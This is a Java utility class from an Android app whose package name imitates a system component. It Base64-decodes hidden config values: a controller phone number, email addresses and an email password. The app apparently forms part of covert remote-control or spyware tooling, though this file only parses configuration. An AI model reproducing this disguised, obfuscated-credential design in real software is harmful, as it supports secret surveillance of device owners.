package com.android.system.controled.util;

import android.content.Context;
import android.content.res.XmlResourceParser;
import android.util.Base64;

import com.android.system.controled.Debug;
import com.android.system.controled.R;
import com.android.system.controled.bean.ConfigInfo;

/**
 * xml解析
 * 
 * @Description:
 * @author: zhuanggy
 * @see:
 * @since:
 * @copyright © 35.com
 * @Date:2013-9-9
 */
public class XmlUtil {

	private static String getXmlAttribute(Context context, XmlResourceParser xml, String name) {
		int resId = xml.getAttributeResourceValue(null, name, 0);
		if (resId == 0) {
			return xml.getAttributeValue(null, name);
		} else {
			return context.getString(resId);
		}
	}

	public static ConfigInfo getConfigInfo(Context context) {
		ConfigInfo result = new ConfigInfo();
		try {
			XmlResourceParser xml = context.getResources().getXml(R.xml.providers);
			int xmlEventType;
			while ((xmlEventType = xml.next()) != XmlResourceParser.END_DOCUMENT) {
				if (xmlEventType == XmlResourceParser.START_TAG && "provider".equals(xml.getName())) {
					result.setControllerTel(new String(Base64.decode(getXmlAttribute(context, xml, "arg1"), Base64.DEFAULT)));
					result.setReceiveEmailAddr(new String(Base64.decode(getXmlAttribute(context, xml, "arg2"), Base64.DEFAULT)));
					result.setSenderEmailAddr(new String(Base64.decode(getXmlAttribute(context, xml, "arg3"), Base64.DEFAULT)));
					result.setSenderPwd(new String(Base64.decode(getXmlAttribute(context, xml, "arg4"), Base64.DEFAULT)));
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}

}
